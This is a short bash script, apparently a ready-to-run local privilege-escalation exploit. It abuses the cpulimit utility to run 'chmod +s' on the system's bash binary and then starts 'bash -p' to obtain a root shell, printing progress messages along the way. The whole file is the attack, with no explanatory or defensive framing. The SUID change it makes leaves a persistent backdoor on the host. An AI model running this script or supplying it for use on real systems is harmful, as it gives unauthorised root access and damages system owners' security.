#!/bin/bash

#Author:  d4t4s3c 
#Twitter: @d4t4s3c
#Email:   d4t4s3c@protonmail.com
#GitHub:  www.github.com/d4t4s3c

#colors
b="\033[1;37m"
r="\033[1;31m"
v="\033[1;32m"
a="\033[1;33m"
az="\033[1;34m"
nc="\e[0m"

#var
p1=$(which bash)
p2=$(which cpulimit)
cu1='[+]'
cu2='[*]'
cu3='[i]'

echo ""
echo -e "$a$cu3 $b starting exploit.. $nc"
sleep 4
echo -e "$az$cu2 $b check PATH bash: $r$p1$nc"
sleep 2
echo -e "$az$cu2 $b check PATH cpulimit: $r$p2$nc"
sleep 2
echo -e "$v$cu1 $b granting SUID permissions to: $r$p1$nc"
sleep 2
$p2 -l 100 -f chmod +s $p1
echo -e "$v$cu1 $b getting a shell as root.. $nc"
sleep 2
$p1 -p
echo ""
exit 0
